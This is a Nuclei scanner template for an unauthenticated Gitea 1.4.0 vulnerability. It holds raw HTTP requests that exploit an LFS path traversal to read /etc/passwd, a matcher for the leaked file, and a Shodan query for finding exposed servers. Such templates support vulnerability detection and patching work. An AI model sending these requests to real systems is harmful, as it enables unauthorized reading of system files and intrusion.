id: gitea-rce
info:
  name: Gitea 1.4.0 - Remote Code Execution
  author: theamanrawat
  severity: critical
  description: A vulnerability in Gitea 1.4.0 allows for remote code execution via
    gitea-rce.
  reference:
  - https://www.exploit-db.com/exploits/44996
  - https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.py
  metadata:
    verified: 'true'
    shodan-query: 'title:"Installation -  Gitea: Git with a cup of tea"'
    impact: The impact of the gitea-rce vulnerability in Gitea 1.4.0 is the potential
      for unauthorized individuals to execute code on affected systems.
    recommendation: It is highly recommended to update to a newer version of Gitea
      to avoid the remote code execution vulnerability in version 1.4.0.
  tags: gitea,rce,unauth,edb
requests:
- raw:
  - 'GET /api/v1/repos/search?limit=1 HTTP/1.1

    Host: {{Hostname}}

    '
  - "POST /{{repo}}.git/info/lfs/objects HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nAccept: application/vnd.git-lfs+json\n\n{\n    \"Oid\": \"\
    ....../../../etc/passwd\",\n    \"Size\": 1000000,\n    \"User\" : \"{{randstr}}\"\
    ,\n    \"Password\" : \"{{randstr}}\",\n    \"Repo\" : \"{{randstr}}\",\n    \"\
    Authorization\" : \"{{randstr}}\"\n}\n"
  - 'GET /{{repo}}.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: regex
    part: body_3
    regex:
    - 'root:.*:0:0:'
  - type: word
    part: header_3
    words:
    - application/octet-stream
  extractors:
  - type: regex
    name: repo
    group: 1
    regex:
    - '"name":".*","full_name":"(.*)","description"'
    internal: true
